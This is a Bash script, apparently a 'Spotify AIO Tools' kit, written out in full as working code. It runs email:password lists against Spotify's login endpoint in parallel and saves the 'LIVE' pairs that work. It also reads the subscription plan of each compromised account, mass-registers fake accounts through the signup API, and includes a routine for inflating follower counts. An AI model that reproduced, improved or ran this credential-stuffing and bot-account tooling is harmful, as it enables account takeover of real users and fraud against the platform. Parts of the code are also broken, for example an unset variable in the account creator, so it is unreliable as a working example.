#!/bin/bash
#NTB4WORLD
tempatTes(){
	if [[ -f spot ]]; then
		echo "Ada"
	else
		echo "gada"
	fi
}
BGNVAVY="\033[1;46m"
BGYELLOW="\033[1;43m"
BGGREEN="\e[1;42m"
BGRED="\e[1;41m"
MER='\033[0;31m'
CY='\033[0;36m'
KUN='\033[1;33m'
ORN='\033[0;33m'
UNG='\033[0;35m'
IJO="\e[32m"
PTH="\e[37m"
NC='\033[0m'
header(){
	printf "${MER}
  ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
  ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
  ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
  ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
  .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
     ${MER}------------------------------------${NC}
        Spotify AIO Tools By NTB4WORLD
     ${MER}------------------------------------${NC}"
     echo ""
     printf " 1. Account Checker.    3. Subscription Check.
 2. Account Register.   4. Follower \n
 Pilih Menu : "
     read menu
     if [[ $menu == "1" ]]; then
     	accountChecker
     elif [[ $menu == "2" ]]; then
     	accountCreator
     elif [[ $menu == "3" ]]; then
     	subsChecker
     fi
}
accountCreator(){
	echo ""
	echo "*note : #username#@#domain.com#"
	echo ""
	echo -n "Total Akun ( 1 ~ 999 ) : "; read total
	echo -n "username : "; read username
	echo -n "domain : "; read domain
	echo -n "password : "; read password
	# for (( i = 0; i < $total; i++ )); do
	# 	mail="${username}${i}@${domain}"
	# 	# echo $mail
	# 	createAkun $mail
	# done
	persend=5
	setleep=1
	for (( i = 0; i < $total; i++ )); do
	# indx=$((con++))
	# totals=$((linetotalsal--))
	set_kirik=$(expr $itung % $persend)
	if [[ $set_kirik == 0 && $itung > 0 ]]; then
		sleep $setleep
	fi
	# email="${emails[$i]}"
	# password="${passwords[$i]}"
		createAkun $mail &
	itung=$[$itung+1]
	done
	# createAkun
}
subsChecker(){
	echo ""
	echo "list in directory"
	ls
	echo -n "choose your list? : "
	read list
	echo "Cleaning Your List..."
	linetotalsal=`grep -c "@" $list`
	con=1
	echo "########################################"
	echo "Total List For Check [$linetotalsal]"
	echo "########################################"
	echo "Preparing Check, Please Wait........"
	if [ ! -f $list ]; then
		echo "$list not found!"
		exit
	fi
	persend=5
	setleep=1
	x=$(gawk -F\| '{ print $1 }' $list)
	y=$(gawk -F\| '{ print $2 }' $list)
	IFS=$'\r\n' GLOBIGNORE='*' command eval  'emails=($x)'
	IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwords=($y)'
	itung=1
	for (( i = 0; i < "${#emails[@]}"; i++ )); do
	indx=$((con++))
	totals=$((linetotalsal--))
	set_kirik=$(expr $itung % $persend)
	if [[ $set_kirik == 0 && $itung > 0 ]]; then
		sleep $setleep
	fi
	email="${emails[$i]}"
	password="${passwords[$i]}"
		cekSubscription $email $password &
	itung=$[$itung+1]
	# rm spotify-cookie.txt
	done
	wait
	duration=$SECONDS
	echo "Done Checking..."
	echo "Clearing the Fvcking Cookies..."
	# rm spotify-cookie.txt
}
accountChecker(){
	if [[ ! -d result ]]; then
		mkdir result
		touch result/live-spotify.txt
		touch result/die-spotify.txt
	fi
	if [[ ! -d tmp ]]; then
		mkdir tmp
	fi
	echo ""
	echo "list in directory"
	ls
	echo -n "choose your list? : "
	read list
	echo "Cleaning Your List..."
	linetotalsal=`grep -c "@" $list`
	con=1
	echo "########################################"
	echo "Total List For Check [$linetotalsal]"
	echo "########################################"
	echo "Preparing Check, Please Wait........"
	if [ ! -f $list ]; then
		echo "$list not found!"
		exit
	fi
	persend=20
	setleep=1
	x=$(gawk -F\| '{ print $1 }' $list)
	y=$(gawk -F\| '{ print $2 }' $list)
	IFS=$'\r\n' GLOBIGNORE='*' command eval  'emails=($x)'
	IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwords=($y)'
	itung=1
	for (( i = 0; i < "${#emails[@]}"; i++ )); do
	indx=$((con++))
	totals=$((linetotalsal--))
	set_kirik=$(expr $itung % $persend)
	if [[ $set_kirik == 0 && $itung > 0 ]]; then
		sleep $setleep
	fi
	email="${emails[$i]}"
	password="${passwords[$i]}"
		getLogin $email $password &
	itung=$[$itung+1]
	done
	wait
	duration=$SECONDS
	echo "Done Checking..."
	echo "Clearing the Fvcking Cookies..."
	# rm spotify-cookie.txt
	# printf "${CY}    Stoped at : `date` \n ${NC}"
	# echo "$(($duration / 3600)) hours $(($duration / 60)) minutes and $(($duration % 60)) seconds elapsed."
}
cekSubscription(){
	getToken
	# if [[ -f spotify-cookie.txt ]]; then
	# 	rm spotify-cookie.txt
	# fi
	bon=$( echo '0|0|0|0|1|1|1|1' | base64 )
	kon=$( curl -s --cookie-jar spotify-cookie.txt --url 'https://accounts.spotify.com/api/login' \
		-H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4" \
		-H "Content-Type: application/x-www-form-urlencoded" \
	    -H "Accept: application/json, text/plain" \
	    -H "Cookie: sp_t=; sp_new=1; __bon=$bon; _gat=1; __tdev=VV4fjDj7; __tvis=BGWgw2Xk; spot=; csrf_token=$csrf_token; remember=7n4qwa5jrogiu7bysts679i3d" \
		--data "remember=false&username=$1&password=$2&csrf_token=$csrf_token&continue=https%3A%2F%2Fopen.spotify.com%2F")
	cekAkun=$(curl -s -b spotify-cookie.txt --url 'https://www.spotify.com/us/account/overview/' \
			-H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4" \
			-H "Content-Type: application/x-www-form-urlencoded" \
		    -H "Accept: application/json, text/plain")
	subs=$( echo $cekAkun | awk -F 'plan":{"name":"' {'print $2'} | cut -d '"' -f1)
	# echo $subs
	printf "${NC}[ $indx/$totals ][${NC} STATUS: ${BGGREEN}LIVE${NC} ] [ LIST${NC} => $1 | $2 ] [${CY} ${MER} $subs ${NC}]${NC}\n"
	
}
getLogin(){
	getToken
	bon=$( echo '0|0|0|0|1|1|1|1' | base64 )
	kon=$( curl -s --url 'https://accounts.spotify.com/api/login' \
		-H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4" \
		-H "Content-Type: application/x-www-form-urlencoded" \
	    -H "Accept: application/json, text/plain" \
	    -H "Cookie: sp_t=; sp_new=1; __bon=$bon; _gat=1; __tdev=VV4fjDj7; __tvis=BGWgw2Xk; spot=; csrf_token=$csrf_token; remember=7n4qwa5jrogiu7bysts679i3d" \
		--data "remember=false&username=$1&password=$2&csrf_token=$csrf_token&continue=https%3A%2F%2Fopen.spotify.com%2F")
	invalid=$( echo $kon | awk -F '{"error":"' {'print $2'} | cut -d '"' -f1 )
	# echo $kon
	if [[ $invalid == "errorInvalidCredentials" ]]; then
		printf "${NC}[ $indx/$totals ][${NC} STATUS: ${BGRED}DEAD${NC} ] [ LIST${NC} => $1 | $2 ] [ ${MER}L34kc0de~${NC} ]${NC}\n"
	else
		printf "${NC}[ $indx/$totals ][${NC} STATUS: ${BGGREEN}LIVE${NC} ] [ LIST${NC} => $1 | $2 ] [${CY} ${MER}L34kc0de~${NC}]${NC}\n"
		echo "$1|$2">>result/live-spotify.txt
	fi
}
getAkses(){
	cok=$( curl -s -b spotify-cookie.txt --url 'https://open.spotify.com/get_access_token?reason=transport&productType=web_player' \
	-H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4" \
	-H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: application/json, text/plain" )
    token=$( echo $cok | awk -F '"accessToken":"' {'print $2'} | cut -d '"' -f1)
    followPlaylist
}
followPlaylist(){
	# echo -n "playlist id : "; read playlist
	kontolp=$( curl -s -b spotify-cookie.txt --url "https://spclient.wg.spotify.com/socialgraph/v2/following?format=json" \
	-H "User-Agent: Spotify/8.5.51 Android/26 (Custom Tablet)" \
    -H "X-Client-Id: 06f21c6a8b7b41279bffabb9537d8286" \
	-H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: text/plain" \
    -H "Spotify-App-Version: 8.5.51" \
    -H "Authorization: Bearer $token" \
    -H "Host: spclient.wg.spotify.com" \
    --data "{"target_uris": ["spotify:user:us97h0ry18rpwzuniep27zbmi"]}")
    echo $kontolp
    echo -n "Hapus Cookie? : [Y/n] ";  read udahan
    if [[ $udahan == "Y" || $udahan == "y" ]]; then
    	rm -rf spotify-cookie.txt
    fi
}
getToken(){
	csrf=$( curl -s -i --url 'https://accounts.spotify.com/' \
	-H "Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4" \
    -H "Upgrade-Insecure-Requests: 1" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
    -H "Cache-Control: max-age=0" \
    -H "Connection: keep-alive" )
    csrf_token=$( echo $csrf | awk -F 'csrf_token=' {'print $2'} | cut -d ';' -f1 )
    # getLogin
}
createAkun(){
	cus=$( curl -s 'https://spclient.wg.spotify.com/signup/public/v1/account/' \
			--data 'iagree=true&birth_day=12&platform=Android-ARM&creation_point=client_mobile&password='${password}'&key=142b583129b2df829de3656f9eb484e6&birth_year=2000&email='${mail}'&gender=male&app_version=849800892&birth_month=12&password_repeat='${password}'' )
	# echo $cus
	cek=$( echo $cus | awk -F '{"status":' {'print $2'} | cut -d ',' -f1 )
	# echo $ce
	if [[ $cek == "1" ]]; then
		printf "[DONE] ${mail}|${password} [!]\n"
	else
		echo "[UPSS] Can't Create Account [!]"
	fi
}
header
